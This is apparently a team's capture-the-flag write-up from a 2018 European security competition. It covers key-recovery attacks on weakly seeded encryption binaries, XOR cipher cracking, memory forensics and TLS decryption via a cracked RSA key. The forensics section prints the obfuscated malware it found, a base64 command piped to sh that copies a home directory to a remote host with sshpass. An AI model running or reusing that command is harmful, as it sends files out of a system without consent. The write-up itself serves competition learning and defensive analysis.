This code seems to to a lot of complex operations, but after playing around with it by generating all possible input values for srand (the range of pids), we noticed that this code could simplified into “srand(pid % 255);”.

The algorithm then generates 256 different keys using rand.


![](/lib/images/articles/ecsc2018final/mabaker1/img2.png)


As there are only 256 possible seeds, there are only 256 combination of keys. The encryption algorithm is really simplistic, and as we can see in the following screen, it is only a simple a simple xor.


![](/lib/images/articles/ecsc2018final/mabaker1/img3.png)


### The attack

We have two critical pieces of information. The first one being that there are only 256 different arrays of keys, and the second one being that the header for docx files is known. The attack is really simple, we the first few bytes of a file, encrypt it with all possible key arrays and see which match the encrypted header. By doing this we only found one possible and it was the right one. Afterwards we only had to decrypt one of the files with the key, open it in word and get the flag !

## Curious service - Pwn

In this challenge we are being provided with a server binary, the same one is running on the service. The goal of this challenge is guessing the key that the server expects for it to send us the flag.

### The algorithm

The server program is pretty straightforward. It waits for a remote connection, gets the key from the client, generates a key on its own and compares them both. If they match we get the flag, if not we are disconnected.


![](/lib/images/articles/ecsc2018final/curiousservice/img1.png)


As we can see here, srand is seeded with the current time. Rand is then used to compute the key. And this is where we have a vulnerability, if the current time of our computer is the same as the one on the server (which should be the case with ntp), we can generate a valid key and get the flag

### The attack

As too many mistakes can be made while translating assembly code to source code, we chose to instrument a server binary with frida, simply call the generate_key function when needed and upload the key to the real server to get the flag. You can see the script we used below.


![](/lib/images/articles/ecsc2018final/curiousservice/img2.png)


Note: The rd-server-gathering is a patched version of the server binary to change the port of the service. It must ran before executing this script.

## Ma Baker returns - Reverse

This challenge is much like the first one as the structure is globally the same. The only difference is added “protections”.

### The algorithm

Across the binary code we can find the same pattern of instructions (add, sub, imul) that can be simplified to a modulo 255. If we look at the code we can see a few calls to SHA1 function and a few loops doing additional rounds of computation on the generated key (as seen in the screenshots below).


![](/lib/images/articles/ecsc2018final/mabaker2/img1.png)



![](/lib/images/articles/ecsc2018final/mabaker2/img2.png)


### The attack

This program is vulnerable in the same way as the previous version, as the seed for srand is computed through a module 255 or the pid. Which means even with the added protection, there is a very limited search space for the keys. To get the flag we only had to dump all possible keys and see which when used gave out a correct docx header. We instrumented the program using radare2 to dump all of the  keys, you can see the code below.


![](/lib/images/articles/ecsc2018final/mabaker2/img3.png)


We then tested all of the valid keys on an encrypted docx, and checked which document was correct. Luckily the first document we opened was the right one.

## Vigenere Cipher Cracking - Crypto

### Finding the key size

To find the key size, we can decompose the cipher text in blocks of size k. k being the key size we guess.By only taking the first bytes of each block and appending them in a string, we can then attempt to xor (case 0)with a single byte. Among the 256 possibilities for each k, only the right key length will produce a string containing printable characters. Using this method, we found a key size of 13.Applying the same technique on the third byte (case 2) and others confirmed the hypothesis.

### Finding the key

Knowing the key size, we can do the same technique as above with k=13 and test for each 13 bytes of the blocks all 256 possible key values. If the key value is correct, it should produce printable characters that could be encountered in an English text.We were able to recover the key:

[69,51,170,26,190,211,28,35,159,239,52,253,109]

### Decrypting the ciphertext

Decryption is simple, we reimplemented the script in Python and inverted the operations:

> \+ -> -

> \- -> +

> ^ -> ^

We can pass the ciphertext and the key to obtain the flag.

## Online Banking OTP Token

Firstly we open the binary in a debugger. After analyzing, we found that the seed is incremented just after the call to iseed(). We break on 0x0804979E after the seed has been incremented and modify the heap to input the wanted seed.

Run the binary again to obtain the wanted token.

## Know Your Brand - Forensic Analysis [Enterprise1] - Forensic

### Setup

Just downloaded the Disk Image and run 'md5sum'

### Prepare the Volatility Image Part 1

Unlike with Windows, with Linux, we need to build a specific profile for each kernel.
Mounting the Disk Image (which contains 3 partitions) revealed that there is two kernel files, vmlinuz-4.4.0-128-generic and vmlinuz-4.4.0-87-generic.

We guessed that the latest kernel is used, 4.4.0-87-generic.

We have to build the profile with the headers : '/usr/src/linux-headers-4.4.0-128-generic/'

### Prepare the Volatility Image Part 2

We also need the correct system map located in '/boot'.
So it's 'System.map-4.4.0-128-generic' according to the kernel version.
And the flag was : 'System.map-4.4.0-128-generic-0389596d78ec13beb366d063a4b8c5c0'

### Analyse the Memory Dump Part 1

We put our profile into the '/tmp/linux-4.4.0-128' and downloaded the latest version of volatility to avoid some bugs.

So we ran : 'python2 /tmp/volatility-master/vol.py --plugins=/tmp/linux-4.4.0-128 --profile LinuxKernel128x64 -f ~/Downloads/mem.lime.1531387925 linux_netstat' to list all the connections.

We found 'TCP 172.30.20.80 :60540 10.85.220.55 : 22 ESTABLISHED ssh/24017' which refers to a connection between a private LAN and an external network.

So the IP that sensitive data is being leaked to is '10.85.220.55'.

### Analyse the Memory Dump Part 2

We ran : 'python2 /tmp/volatility-master/vol.py --plugins=/tmp/linux-4.4.0-128 --profile LinuxKernel128x64 -f ~/Downloads/mem.lime.1531387925 linux_psaux | grep 10.85.220.55' to list all the process and keep only those which have the IP 10.85.220.55 in their command line.

Once we have the process with their PID, we summed them.

We got : '72036'

### Locate the Exploited Process

Without the grep, we saw that 'backup-manager' was suspicious because it seems to be the parent of some leaks with rsync.

### Locate the Malicious Command

We checked the contents of '/usr/share/backup-manager' with the original deb from Ubuntu 16.04. We found that '/usr/share/backup-manager/md5sum' was a file that wasn't in the deb file and '/usr/share/backup-manager/actions.sh' was modified. Its permissions were 744 while the original actions.sh was 644.

### Establish the Obfuscation Mechanism

When we look at the contents of '/usr/share/backup-manager/md5sum', we saw : 

```bash
bash -c "echo 'cnN5bmMgLXZyeiAtLXJzaD0ic3NocGFzcyAtcCB1YnNzaGFkbWluIHNzaCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLWwgdWJzc2hhZG1pbiIgL2hvbWUvbGFiIHVic3NoYWRtaW5AMTAuODUuMjIwLjU1Oi9ob21lL3N0b2xlbnNlY3JldHMgJj4vZGV2L251bGwK' | base64 -d | sh
```

Which indicate a base64 encoding.

### Locate the Malicious Call

We saw that '/usr/share/backup-manager/actions.sh' was modified and indeed, it called the malware 'md5sum' which wasn't in the original.

## Know Your Brand - RSA Analysis - Crypto

### Analyze Packet Capture Data

By loading the pcap into wireshark and looking at the tls traffic, we quickly come across the ciphersuite.

### Decrypt the SSL traffic

From wireshark , we dumped the TLS certificate in the DER format. We used openssl to convert it to PEM, and extract its public key.

```bash 
$ openssl x509 -inform der -in cert_extracted.der -outform pem -out cert.pem
$ openssl x509 -pubkey -noout -in cert.pem > pubkey.pem
```

We then used RsaCtfTool to crack and recover the private key.

```bash
$ ~/Documents/Tools/RsaCtfTool/RsaCtfTool.py --publickey pubkey.pem –private > privkey.pem
```

Then we loaded the private key into wireshark and it decrypted the TLS traffic. From this point , we struggled a bit in front of the 150+ decrypted TLS streams. We used tshark to get all the decrypteed stream and grepped for “flag” in it.

```bash
$ for i in {0..200}; do echo $i && tshark -r cap01.pcap -q -o "ssl.keys_list:172.30.11.10,443,http,privkey.pem"  -z "follow,ssl,ascii,$i" |grep -i flag; done
```

5 minutes later, the flagged popped in our terminal.

### Unzip the second file

Using the password of the previous step , we unziped the given zip. By looking at the README.txt file, we figured out that we need to focus on the genCsr.py file. 
We looked at the commit logs for that file :

```bash
$ git log – genCsr.py
```
And we found only 2 commits, which gave us all the information for the 3 last questions.

